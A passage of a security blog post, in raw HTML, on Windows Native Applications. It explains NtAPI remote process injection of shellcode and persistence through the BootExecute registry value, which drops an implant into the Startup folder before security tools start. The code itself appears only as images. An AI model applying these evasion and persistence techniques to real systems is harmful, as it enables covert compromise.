data-breakout="normal"><div class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-cvhpf301459"><span class="vMus0"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block89"></div><div data-breakout="normal"><h3 class="CwsM- nAEMg Z7lok X7MWW" dir="auto" id="viewer-synka15247"><span class="-pTyw"><strong style="font-weight:700"><span style="font-size:18px"><span style="color:#fd6262;text-decoration:inherit"><span>Remote Process Injection</span></span></span></strong></span></h3></div><div type="heading" data-hook="rcv-block90"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-c7qvl15249"><span class="vMus0"><span>Because we can’t self-inject MSFVenom shellcode into our process, we have to find another process to execute our shellcode. We can use a well known malware technique, remote process injection to achieve this effect, even with a Native Application. Remote process injection infamously uses a WinAPI chain that looks like this:</span></span></p></div><div type="paragraph" data-hook="rcv-block91"></div><div data-breakout="normal"><div class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-qnpzf15251"><span class="vMus0"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block92"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-kwtxu204155"><span class="vMus0"><span style="color:#fd6262;text-decoration:inherit"><span>OpenProcess</span></span><span>&nbsp;-&gt; </span><span style="color:#fd6262;text-decoration:inherit"><span>VirtalAllocEx</span></span><span>&nbsp;-&gt; </span><span style="color:#fd6262;text-decoration:inherit"><span>WriteProcessMemory</span></span><span>&nbsp;-&gt; </span><span style="color:#fd6262;text-decoration:inherit"><span>VirtualProtectEx</span></span><span>&nbsp;-&gt; </span><span style="color:#fd6262;text-decoration:inherit"><span>CreateRemoteThread</span></span></span></p></div><div type="paragraph" data-hook="rcv-block93"></div><div data-breakout="normal"><div class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-bo2qo15253"><span class="vMus0"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block94"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-qmc5e207578"><span class="vMus0"><span>The chain of NtAPI calls following this same pattern would like this this:</span></span></p></div><div type="paragraph" data-hook="rcv-block95"></div><div data-breakout="normal"><div class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-qgxcj211012"><span class="vMus0"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block96"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-3apkh15255"><span class="vMus0"><span style="color:#fd6262;text-decoration:inherit"><span>NtOpenProcess</span></span><span>&nbsp;-&gt; </span><span style="color:#fd6262;text-decoration:inherit"><span>NtAllocateVirtualMemory </span></span><span>-&gt; </span><span style="color:#fd6262;text-decoration:inherit"><span>NtWriteVirtualMemory</span></span><span>&nbsp;-&gt; </span><span style="color:#fd6262;text-decoration:inherit"><span>NtProtectVirtualMemory</span></span><span>&nbsp;-&gt; </span><span style="color:#fd6262;text-decoration:inherit"><span>NtCreateThreadEx</span></span></span></p></div><div type="paragraph" data-hook="rcv-block97"></div><div data-breakout="normal"><div class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-vdgt715257"><span class="vMus0"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block98"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-8bqkm237633"><span class="vMus0"><span>One thing we can do to simplify our implementation a little bit, is to naively inject into a process that we &nbsp;have permissions to access. So instead of the NtAPI chain above, we can use the following:</span></span></p></div><div type="paragraph" data-hook="rcv-block99"></div><div data-breakout="normal"><div class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-20809310373"><span class="vMus0"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block100"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-dsbhb15259"><span class="vMus0"><span style="color:#fd6262;text-decoration:inherit"><span>NtGetNextProcess</span></span><span>&nbsp;-&gt; </span><span style="color:#fd6262;text-decoration:inherit"><span>NtAllocateVirtualMemory</span></span><span>&nbsp;-&gt; </span><span style="color:#fd6262;text-decoration:inherit"><span>NtWriteVirtualMemory</span></span><span>&nbsp;-&gt; </span><span style="color:#fd6262;text-decoration:inherit"><span>NtProtectVirtualMemory</span></span><span>&nbsp;-&gt; </span><span style="color:#fd6262;text-decoration:inherit"><span>NtCreateThreadEx</span></span></span></p></div><div type="paragraph" data-hook="rcv-block101"></div><div data-breakout="normal"><div class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-r7akq15261"><span class="vMus0"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block102"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-rny3f383660"><span class="vMus0"><span>And we can therefore use the NtGetNextProcess function to get a handle to a process that has the permissions specified in the second parameter.</span></span></p></div><div type="paragraph" data-hook="rcv-block103"></div><div data-breakout="normal"><div class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-6i2vg15263"><span class="vMus0"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block104"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-rmdua387162"><span class="vMus0"><span>To get started implementing remote process injection, we use the NtGetNextProcess and ask for a handle to a process that we can open with PROCESS_ALL_ACCESS permissions:</span></span></p></div><div type="paragraph" data-hook="rcv-block105"></div><div data-breakout="normal"><div class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-ds48r39822"><span class="vMus0"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block106"></div><div data-breakout="normal"><div class="i5TUk" id="viewer-dlymm3094"><div class="J9Vi9"><figure class="OPDJf" data-hook="figure-IMAGE"><a class="Vxa2D has-custom-focus LBfZl" tabindex="0" target="_self"><div data-hook="image-viewer" class="fnfJM"><div style="--dim-height:106;--dim-width:740;--ricos-image-default-border-color:unset" id="dlymm3094" class="_49X-U wNivC _8xVnn" data-hook="image-viewer-dlymm3094"><wow-image id="0628ff_f7de89f80fae4f2dba3afd83b7a37c70~mv2.webp" class="undefined tKegW" data-image-info="{&quot;containerId&quot;:&quot;dlymm3094&quot;,&quot;alignType&quot;:&quot;center&quot;,&quot;displayMode&quot;:&quot;fill&quot;,&quot;isLQIP&quot;:true,&quot;isSEOBot&quot;:false,&quot;lqipTransition&quot;:&quot;blur&quot;,&quot;encoding&quot;:&quot;AVIF&quot;,&quot;imageData&quot;:{&quot;width&quot;:740,&quot;height&quot;:106,&quot;uri&quot;:&quot;0628ff_f7de89f80fae4f2dba3afd83b7a37c70~mv2.webp&quot;,&quot;name&quot;:&quot;&quot;,&quot;displayMode&quot;:&quot;fill&quot;}}" data-motion-part="BG_IMG dlymm3094" data-bg-effect-name="" data-has-ssr-src="true" data-animate-blur="" data-is-responsive="true"><img src="https://static.wixstatic.com/media/0628ff_f7de89f80fae4f2dba3afd83b7a37c70~mv2.webp/v1/fill/w_133,h_19,al_c,q_80,usm_0.66_1.00_0.01,blur_2,enc_avif,quality_auto/0628ff_f7de89f80fae4f2dba3afd83b7a37c70~mv2.webp" alt="" style="width:100%;height:100%;object-fit:cover;object-position:50% 50%;max-width:100%;position:absolute;left:0;top:0" data-pin-url="https://www.protexity.com/post/going-native-malicious-native-applications" data-pin-media="https://static.wixstatic.com/media/0628ff_f7de89f80fae4f2dba3afd83b7a37c70~mv2.webp/v1/fill/w_1036,h_148,al_c,lg_1,q_80/0628ff_f7de89f80fae4f2dba3afd83b7a37c70~mv2.webp" draggable="false"></wow-image></div><button class="KxJvA" type="button" data-hook="image-expand-button" aria-label="Expand image"><svg viewBox="0 0 19 19" xmlns="http://www.w3.org/2000/svg" class="C02F9"><path d="M15.071 8.371V4.585l-4.355 4.356a.2.2 0 0 1-.283 0l-.374-.374a.2.2 0 0 1 0-.283l4.356-4.355h-3.786a.2.2 0 0 1-.2-.2V3.2c0-.11.09-.2.2-.2H16v5.371a.2.2 0 0 1-.2.2h-.529a.2.2 0 0 1-.2-.2zm-6.5 6.9v.529a.2.2 0 0 1-.2.2H3v-5.371c0-.11.09-.2.2-.2h.529c.11 0 .2.09.2.2v3.786l4.355-4.356a.2.2 0 0 1 .283 0l.374.374a.2.2 0 0 1 0 .283L4.585 15.07h3.786c.11 0 .2.09.2.2z" fill="#000" fill-rule="nonzero"></path></svg></button></div></a></figure></div></div></div><div type="image" data-hook="rcv-block107"></div><div data-breakout="normal"><p class="Rc39c HhrTy RISpW X7MWW" dir="auto" id="viewer-cubon3181"><span class="vMus0"><span style="font-size:14px"><span>Figure 10 - Iterate until we successfully find a process we have permissions to</span></span></span></p></div><div type="paragraph" data-hook="rcv-block108"></div><div data-breakout="normal"><div class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-jqe5p410968"><span class="vMus0"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block109"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-wp3be15268"><span class="vMus0"><span>Then we implement our remote process injection with the NtAPI we listed above:</span></span></p></div><div type="paragraph" data-hook="rcv-block110"></div><div data-breakout="normal"><div class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-1prul41966"><span class="vMus0"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block111"></div><div data-breakout="normal"><div class="i5TUk" id="viewer-2ls1j3531"><div class="J9Vi9"><figure class="OPDJf" data-hook="figure-IMAGE"><a class="Vxa2D has-custom-focus LBfZl" tabindex="0" target="_self"><div data-hook="image-viewer" class="fnfJM"><div style="--dim-height:137;--dim-width:740;--ricos-image-default-border-color:unset" id="2ls1j3531" class="_49X-U wNivC _8xVnn" data-hook="image-viewer-2ls1j3531"><wow-image id="0628ff_e44ad83cce314eddaf567f8dd0bc5d7a~mv2.webp" class="undefined tKegW" data-image-info="{&quot;containerId&quot;:&quot;2ls1j3531&quot;,&quot;alignType&quot;:&quot;center&quot;,&quot;displayMode&quot;:&quot;fill&quot;,&quot;isLQIP&quot;:true,&quot;isSEOBot&quot;:false,&quot;lqipTransition&quot;:&quot;blur&quot;,&quot;encoding&quot;:&quot;AVIF&quot;,&quot;imageData&quot;:{&quot;width&quot;:740,&quot;height&quot;:137,&quot;uri&quot;:&quot;0628ff_e44ad83cce314eddaf567f8dd0bc5d7a~mv2.webp&quot;,&quot;name&quot;:&quot;&quot;,&quot;displayMode&quot;:&quot;fill&quot;}}" data-motion-part="BG_IMG 2ls1j3531" data-bg-effect-name="" data-has-ssr-src="true" data-animate-blur="" data-is-responsive="true"><img src="https://static.wixstatic.com/media/0628ff_e44ad83cce314eddaf567f8dd0bc5d7a~mv2.webp/v1/fill/w_133,h_25,al_c,q_80,usm_0.66_1.00_0.01,blur_2,enc_avif,quality_auto/0628ff_e44ad83cce314eddaf567f8dd0bc5d7a~mv2.webp" alt="" style="width:100%;height:100%;object-fit:cover;object-position:50% 50%;max-width:100%;position:absolute;left:0;top:0" data-pin-url="https://www.protexity.com/post/going-native-malicious-native-applications" data-pin-media="https://static.wixstatic.com/media/0628ff_e44ad83cce314eddaf567f8dd0bc5d7a~mv2.webp/v1/fill/w_1036,h_192,al_c,lg_1,q_80/0628ff_e44ad83cce314eddaf567f8dd0bc5d7a~mv2.webp" draggable="false"></wow-image></div><button class="KxJvA" type="button" data-hook="image-expand-button" aria-label="Expand image"><svg viewBox="0 0 19 19" xmlns="http://www.w3.org/2000/svg" class="C02F9"><path d="M15.071 8.371V4.585l-4.355 4.356a.2.2 0 0 1-.283 0l-.374-.374a.2.2 0 0 1 0-.283l4.356-4.355h-3.786a.2.2 0 0 1-.2-.2V3.2c0-.11.09-.2.2-.2H16v5.371a.2.2 0 0 1-.2.2h-.529a.2.2 0 0 1-.2-.2zm-6.5 6.9v.529a.2.2 0 0 1-.2.2H3v-5.371c0-.11.09-.2.2-.2h.529c.11 0 .2.09.2.2v3.786l4.355-4.356a.2.2 0 0 1 .283 0l.374.374a.2.2 0 0 1 0 .283L4.585 15.07h3.786c.11 0 .2.09.2.2z" fill="#000" fill-rule="nonzero"></path></svg></button></div></a></figure></div></div></div><div type="image" data-hook="rcv-block112"></div><div data-breakout="normal"><p class="Rc39c HhrTy RISpW X7MWW" dir="auto" id="viewer-02ajs3620"><span class="vMus0"><span style="font-size:14px"><span>Figure 11 - NtAPI implementation of remote process injection</span></span></span></p></div><div type="paragraph" data-hook="rcv-block113"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-fbjs515273"><span class="vMus0"><span>&nbsp;</span></span></p></div><div type="paragraph" data-hook="rcv-block114"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-k11fj15275"><span class="vMus0"><span>It’s important to note that even though these APIs are similar to their WinAPI counterparts, they require more granular manipulation to achieve the same effects that you might be used to. The most common difference is that NtAPI will often take pointers to pointers as arguments, which can take some getting used to. NtAPI calls also typically take more arguments, and one of those arguments is typically the output handle or output pointer. This is because syscalls return a status code in the RAX register on return from kernel space. You’ll see this implemented in open-source examples as an NTSTATUS variable used for error checking. It’s omitted in the example above for brevity.</span></span></p></div><div type="paragraph" data-hook="rcv-block115"></div><div data-breakout="normal"><div class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-issmp15277"><span class="vMus0"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block116"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-hebx2445855"><span class="vMus0"><span>Now, similarly to the classic WinAPI implementation if we run our Native Application we successfully pop a calculator:</span></span></p></div><div type="paragraph" data-hook="rcv-block117"></div><div data-breakout="normal"><div class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-rhutg43577"><span class="vMus0"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block118"></div><div data-breakout="normal"><div class="i5TUk" id="viewer-50km13982"><div class="J9Vi9"><figure class="OPDJf" data-hook="figure-IMAGE"><a class="Vxa2D has-custom-focus LBfZl" tabindex="0" target="_self"><div data-hook="image-viewer" class="fnfJM"><div style="--dim-height:146;--dim-width:740;--ricos-image-default-border-color:unset" id="50km13982" class="_49X-U wNivC _8xVnn" data-hook="image-viewer-50km13982"><wow-image id="0628ff_93856a34b9bb401d9efcbe13b221eb64~mv2.webp" class="undefined tKegW" data-image-info="{&quot;containerId&quot;:&quot;50km13982&quot;,&quot;alignType&quot;:&quot;center&quot;,&quot;displayMode&quot;:&quot;fill&quot;,&quot;isLQIP&quot;:true,&quot;isSEOBot&quot;:false,&quot;lqipTransition&quot;:&quot;blur&quot;,&quot;encoding&quot;:&quot;AVIF&quot;,&quot;imageData&quot;:{&quot;width&quot;:740,&quot;height&quot;:146,&quot;uri&quot;:&quot;0628ff_93856a34b9bb401d9efcbe13b221eb64~mv2.webp&quot;,&quot;name&quot;:&quot;&quot;,&quot;displayMode&quot;:&quot;fill&quot;}}" data-motion-part="BG_IMG 50km13982" data-bg-effect-name="" data-has-ssr-src="true" data-animate-blur="" data-is-responsive="true"><img src="https://static.wixstatic.com/media/0628ff_93856a34b9bb401d9efcbe13b221eb64~mv2.webp/v1/fill/w_133,h_26,al_c,q_80,usm_0.66_1.00_0.01,blur_2,enc_avif,quality_auto/0628ff_93856a34b9bb401d9efcbe13b221eb64~mv2.webp" alt="" style="width:100%;height:100%;object-fit:cover;object-position:50% 50%;max-width:100%;position:absolute;left:0;top:0" data-pin-url="https://www.protexity.com/post/going-native-malicious-native-applications" data-pin-media="https://static.wixstatic.com/media/0628ff_93856a34b9bb401d9efcbe13b221eb64~mv2.webp/v1/fill/w_1036,h_204,al_c,lg_1,q_80/0628ff_93856a34b9bb401d9efcbe13b221eb64~mv2.webp" draggable="false"></wow-image></div><button class="KxJvA" type="button" data-hook="image-expand-button" aria-label="Expand image"><svg viewBox="0 0 19 19" xmlns="http://www.w3.org/2000/svg" class="C02F9"><path d="M15.071 8.371V4.585l-4.355 4.356a.2.2 0 0 1-.283 0l-.374-.374a.2.2 0 0 1 0-.283l4.356-4.355h-3.786a.2.2 0 0 1-.2-.2V3.2c0-.11.09-.2.2-.2H16v5.371a.2.2 0 0 1-.2.2h-.529a.2.2 0 0 1-.2-.2zm-6.5 6.9v.529a.2.2 0 0 1-.2.2H3v-5.371c0-.11.09-.2.2-.2h.529c.11 0 .2.09.2.2v3.786l4.355-4.356a.2.2 0 0 1 .283 0l.374.374a.2.2 0 0 1 0 .283L4.585 15.07h3.786c.11 0 .2.09.2.2z" fill="#000" fill-rule="nonzero"></path></svg></button></div></a></figure></div></div></div><div type="image" data-hook="rcv-block119"></div><div data-breakout="normal"><p class="Rc39c HhrTy RISpW X7MWW" dir="auto" id="viewer-s41244075"><span class="vMus0"><span style="font-size:14px"><span>Figure 12 - Calc.exe initiated from out Native Application’s remote process injection</span></span></span></p></div><div type="paragraph" data-hook="rcv-block120"></div><div data-breakout="normal"><div class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-7yalq469984"><span class="vMus0"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block121"></div><div data-breakout="normal"><h3 class="CwsM- nAEMg Z7lok X7MWW" dir="auto" id="viewer-qm7pi15282"><span class="-pTyw"><strong style="font-weight:700"><span style="font-size:18px"><span style="color:#fd6262;text-decoration:inherit"><span>Early Boot Access</span></span></span></strong></span></h3></div><div type="heading" data-hook="rcv-block122"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-i61u715284"><span class="vMus0"><span>Another interesting use case for Native Applications comes from their ability to interact with the Windows file system very early in the boot process, before many security solutions have been properly initiated. This creates a blind spot that we can potentially use to establish persistence on a system in a manner that’s opaque to security solutions.</span></span></p></div><div type="paragraph" data-hook="rcv-block123"></div><div data-breakout="normal"><div class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-9xeka478611"><span class="vMus0"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block124"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-jpd1n15286"><span class="vMus0"><span>Using Administrator permissions we can access the Registry Editor and navigate to:</span></span></p></div><div type="paragraph" data-hook="rcv-block125"></div><div data-breakout="normal"><div class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-sfe7f15288"><span class="vMus0"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block126"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-y4cyj488507"><span class="vMus0"><span style="color:#fd6262;text-decoration:inherit"><span>Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager</span></span></span></p></div><div type="paragraph" data-hook="rcv-block127"></div><div data-breakout="normal"><div class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-6czr2506597"><span class="vMus0"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block128"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-iifh2492411"><span class="vMus0"><span>and examine the BootExecute entry:</span></span></p></div><div type="paragraph" data-hook="rcv-block129"></div><div data-breakout="normal"><div class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-43xsq46528"><span class="vMus0"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block130"></div><div data-breakout="normal"><div class="i5TUk" id="viewer-mq4li4358"><div class="J9Vi9"><figure class="OPDJf" data-hook="figure-IMAGE"><a class="Vxa2D has-custom-focus LBfZl" tabindex="0" target="_self"><div data-hook="image-viewer" class="fnfJM"><div style="--dim-height:184;--dim-width:740;--ricos-image-default-border-color:unset" id="mq4li4358" class="_49X-U wNivC _8xVnn" data-hook="image-viewer-mq4li4358"><wow-image id="0628ff_8252afa29d9b4164952381fd53ffc1f0~mv2.webp" class="undefined tKegW" data-image-info="{&quot;containerId&quot;:&quot;mq4li4358&quot;,&quot;alignType&quot;:&quot;center&quot;,&quot;displayMode&quot;:&quot;fill&quot;,&quot;isLQIP&quot;:true,&quot;isSEOBot&quot;:false,&quot;lqipTransition&quot;:&quot;blur&quot;,&quot;encoding&quot;:&quot;AVIF&quot;,&quot;imageData&quot;:{&quot;width&quot;:740,&quot;height&quot;:184,&quot;uri&quot;:&quot;0628ff_8252afa29d9b4164952381fd53ffc1f0~mv2.webp&quot;,&quot;name&quot;:&quot;&quot;,&quot;displayMode&quot;:&quot;fill&quot;}}" data-motion-part="BG_IMG mq4li4358" data-bg-effect-name="" data-has-ssr-src="true" data-animate-blur="" data-is-responsive="true"><img src="https://static.wixstatic.com/media/0628ff_8252afa29d9b4164952381fd53ffc1f0~mv2.webp/v1/fill/w_133,h_33,al_c,q_80,usm_0.66_1.00_0.01,blur_2,enc_avif,quality_auto/0628ff_8252afa29d9b4164952381fd53ffc1f0~mv2.webp" alt="" style="width:100%;height:100%;object-fit:cover;object-position:50% 50%;max-width:100%;position:absolute;left:0;top:0" data-pin-url="https://www.protexity.com/post/going-native-malicious-native-applications" data-pin-media="https://static.wixstatic.com/media/0628ff_8252afa29d9b4164952381fd53ffc1f0~mv2.webp/v1/fill/w_1036,h_258,al_c,lg_1,q_80/0628ff_8252afa29d9b4164952381fd53ffc1f0~mv2.webp" draggable="false"></wow-image></div><button class="KxJvA" type="button" data-hook="image-expand-button" aria-label="Expand image"><svg viewBox="0 0 19 19" xmlns="http://www.w3.org/2000/svg" class="C02F9"><path d="M15.071 8.371V4.585l-4.355 4.356a.2.2 0 0 1-.283 0l-.374-.374a.2.2 0 0 1 0-.283l4.356-4.355h-3.786a.2.2 0 0 1-.2-.2V3.2c0-.11.09-.2.2-.2H16v5.371a.2.2 0 0 1-.2.2h-.529a.2.2 0 0 1-.2-.2zm-6.5 6.9v.529a.2.2 0 0 1-.2.2H3v-5.371c0-.11.09-.2.2-.2h.529c.11 0 .2.09.2.2v3.786l4.355-4.356a.2.2 0 0 1 .283 0l.374.374a.2.2 0 0 1 0 .283L4.585 15.07h3.786c.11 0 .2.09.2.2z" fill="#000" fill-rule="nonzero"></path></svg></button></div></a></figure></div></div></div><div type="image" data-hook="rcv-block131"></div><div data-breakout="normal"><p class="Rc39c HhrTy RISpW X7MWW" dir="auto" id="viewer-mcb9f4457"><span class="vMus0"><span style="font-size:14px"><span>Figure 13 - BootExecute in RegistryEditor</span></span></span></p></div><div type="paragraph" data-hook="rcv-block132"></div><div data-breakout="normal"><div class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-7n6ry541360"><span class="vMus0"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block133"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-ng10b15295"><span class="vMus0"><em style="font-style:italic"><span>Windows System Internals pt. 1</span></em><span>&nbsp;tells us that the executables listed under BootExecute are run very early in the Windows initialization process. In this early portion of the startup process, KnownDlls have not been mapped, and in normal conditions the autocheck executable performs a disk check that allows for the boot process to continue. It’s important here to remember that no Windows Subsystem executables will be running at this point in startup. This means that the native injector we developed earlier in this writeup will end up injecting into a Native Application, and the shellcode will fail to execute properly because our shellcode relies on being able to access kernel32, which is not loaded into Native Applications.</span></span></p></div><div type="paragraph" data-hook="rcv-block134"></div><div data-breakout="normal"><div class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-f7agp15298"><span class="vMus0"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block135"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-u8zej117165"><span class="vMus0"><span>So, to gain utility out of this access it’s important to develop a Native Application that can drop a Windows Executable into one of the many autostart persistence locations that the Windows Subsystem will access as the startup process continues. We can do this by using the NtCreateFile and NtWriteFile NtAPIs to drop a conventional Windows self-injecting implant to disk.</span></span></p></div><div type="paragraph" data-hook="rcv-block136"></div><div data-breakout="normal"><div class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-y923715300"><span class="vMus0"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block137"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-v5sjy119037"><span class="vMus0"><span>In this writeup, we’ll be using the following directory:</span></span></p></div><div type="paragraph" data-hook="rcv-block138"></div><div data-breakout="normal"><div class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-yapl2558075"><span class="vMus0"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block139"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-xngig15302"><span class="vMus0"><span style="color:#fd6262;text-decoration:inherit"><span>%APPDATA%\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</span></span></span></p></div><div type="paragraph" data-hook="rcv-block140"></div><div data-breakout="normal"><div class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-lx2xi46802"><span class="vMus0"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block141"></div><div data-breakout="normal"><div class="i5TUk" id="viewer-wo9jg4758"><div class="J9Vi9"><figure class="OPDJf" data-hook="figure-IMAGE"><a class="Vxa2D has-custom-focus LBfZl" tabindex="0" target="_self"><div data-hook="image-viewer" class="fnfJM"><div style="--dim-height:352;--dim-width:740;--ricos-image-default-border-color:unset" id="wo9jg4758" class="_49X-U wNivC _8xVnn" data-hook="image-viewer-wo9jg4758"><wow-image id="0628ff_2497f778eb5b44b8b0ffdde16e8f67c3~mv2.webp" class="undefined tKegW" data-image-info="{&quot;containerId&quot;:&quot;wo9jg4758&quot;,&quot;alignType&quot;:&quot;center&quot;,&quot;displayMode&quot;:&quot;fill&quot;,&quot;isLQIP&quot;:true,&quot;isSEOBot&quot;:false,&quot;lqipTransition&quot;:&quot;blur&quot;,&quot;encoding&quot;:&quot;AVIF&quot;,&quot;imageData&quot;:{&quot;width&quot;:740,&quot;height&quot;:352,&quot;uri&quot;:&quot;0628ff_2497f778eb5b44b8b0ffdde16e8f67c3~mv2.webp&quot;,&quot;name&quot;:&quot;&quot;,&quot;displayMode&quot;:&quot;fill&quot;}}" data-motion-part="BG_IMG wo9jg4758" data-bg-effect-name="" data-has-ssr-src="true" data-animate-blur="" data-is-responsive="true"><img src="https://static.wixstatic.com/media/0628ff_2497f778eb5b44b8b0ffdde16e8f67c3~mv2.webp/v1/fill/w_133,h_63,al_c,q_80,usm_0.66_1.00_0.01,blur_2,enc_avif,quality_auto/0628ff_2497f778eb5b44b8b0ffdde16e8f67c3~mv2.webp" alt="" style="width:100%;height:100%;object-fit:cover;object-position:50% 50%;max-width:100%;position:absolute;left:0;top:0" data-pin-url="https://www.protexity.com/post/going-native-malicious-native-applications" data-pin-media="https://static.wixstatic.com/media/0628ff_2497f778eb5b44b8b0ffdde16e8f67c3~mv2.webp/v1/fill/w_888,h_422,al_c,lg_1,q_85/0628ff_2497f778eb5b44b8b0ffdde16e8f67c3~mv2.webp" draggable="false"></wow-image></div><button class="KxJvA" type="button" data-hook="image-expand-button" aria-label="Expand image"><svg viewBox="0 0 19 19" xmlns="http://www.w3.org/2000/svg" class="C02F9"><path d="M15.071 8.371V4.585l-4.355 4.356a.2.2 0 0 1-.283 0l-.374-.374a.2.2 0 0 1 0-.283l4.356-4.355h-3.786a.2.2 0 0 1-.2-.2V3.2c0-.11.09-.2.2-.2H16v5.371a.2.2 0 0 1-.2.2h-.529a.2.2 0 0 1-.2-.2zm-6.5 6.9v.529a.2.2 0 0 1-.2.2H3v-5.371c0-.11.09-.2.2-.2h.529c.11 0 .2.09.2.2v3.786l4.355-4.356a.2.2 0 0 1 .283 0l.374.374a.2.2 0 0 1 0 .283L4.585 15.07h3.786c.11 0 .2.09.2.2z" fill="#000" fill-rule="nonzero"></path></svg></button></div></a></figure></div></div></div><div type="image" data-hook="rcv-block142"></div><div data-breakout="normal"><p class="Rc39c HhrTy RISpW X7MWW" dir="auto" id="viewer-f5vos4863"><span class="vMus0"><span style="font-size:14px"><span>Figure 14 - Our Native Application drops a conventional self-injector to the startup directory on boot</span></span></span></p></div><div type="paragraph" data-hook="rcv-block143"></div><div data-breakout="normal"><div class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-100mz573040"><span class="vMus0"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block144"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-cjmpy590103"><span class="vMus0"><span>In the above screenshot line 23 creates a large buffer that contains a Windows Application as bytes. Lines 325 to 339 create local variables that we’ll need in our NtAPI calls. Line 341 initializes the OBJECT_ATTRIBUTES structure that we pass into NtCreateFile on line 343. NtCreateFile gives us a file handle to the newly created file. Line 347 then calls NtWriteFile writes the raw bytes in our Native Application to disk at the startup location discussed above. Next, as a debugging step I called NtDrawText to print the file path during the boot process and validate that the Native Application is working as intended. Lines 352 to 367 are just cleanup.</span></span></p></div><div type="paragraph" data-hook="rcv-block145"></div><div data-breakout="normal"><div class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-vt6qr15309"><span class="vMus0"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block146"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-k4s4q122283"><span class="vMus0"><span>Now, to get our Native Application to start up as part of the BootExec executables, we must move it into System32, and add it to the BootExec registry entry that we saw earlier. As you develop your own executables to test and explore the capabilities of Native Applications, do not forget to replace the copy 